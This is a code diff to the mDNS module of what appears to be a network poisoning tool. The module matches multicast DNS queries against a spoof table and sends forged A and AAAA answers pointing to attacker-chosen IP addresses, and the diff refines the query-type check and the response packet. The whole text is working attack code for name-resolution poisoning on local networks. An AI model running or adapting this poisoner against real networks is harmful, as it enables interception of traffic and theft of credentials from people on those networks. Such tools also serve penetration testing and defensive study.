@@ -1,3 +1,6 @@
+
+#https://tools.ietf.org/html/rfc6762
+import re
 import socket
 import struct
 import logging
@@ -91,27 +94,27 @@ class MDNS(ResponderServer):
 				if self.globalsession.poisonermode == PoisonerMode.ANALYSE:
 					for q in msg.Questions:
 						self.logPoisonResult(requestName = q.QNAME.name)
-
 				else:
 					answers = []
 					for targetRE, ip in self.globalsession.spooftable:
 						for q in msg.Questions:
-							if targetRE.match(q.QNAME.name):
-								self.logPoisonResult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
-								#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
-								if ip.version == 4:
-									res = DNSAResource.construct(q.QNAME.name, ip)
-								elif ip.version == 6:
-									res = DNSAAAAResource.construct(q.QNAME.name, ip)
-								else:
-									raise Exception('This IP version scares me...')
-								#res.construct(q.QNAME, NBRType.NB, ip)
-								answers.append(res)
+							if q.QTYPE == DNSType.A or q.QTYPE == DNSType.AAAA:
+								if targetRE.match(q.QNAME.name):
+									self.logPoisonResult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
+									#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
+									if ip.version == 4:
+										res = DNSAResource.construct(q.QNAME.name, ip)
+									elif ip.version == 6:
+										res = DNSAAAAResource.construct(q.QNAME.name, ip)
+									else:
+										raise Exception('This IP version scares me...')
+									#res.construct(q.QNAME, NBRType.NB, ip)
+									answers.append(res)
 					
-					response = DNSPacket.construct(TID = msg.TransactionID, 
-													 response    = DNSResponse.RESPONSE, 
-													 additionals = answers,
-													 questions   = msg.Questions)
+					response = DNSPacket.construct(TID = b'\x00\x00', 
+													 response  = DNSResponse.RESPONSE, 
+													 answers   = answers
+													 )
 
 					yield from asyncio.wait_for(self.send_data(response.toBytes(), self.globalsession.maddr), timeout=1)
 
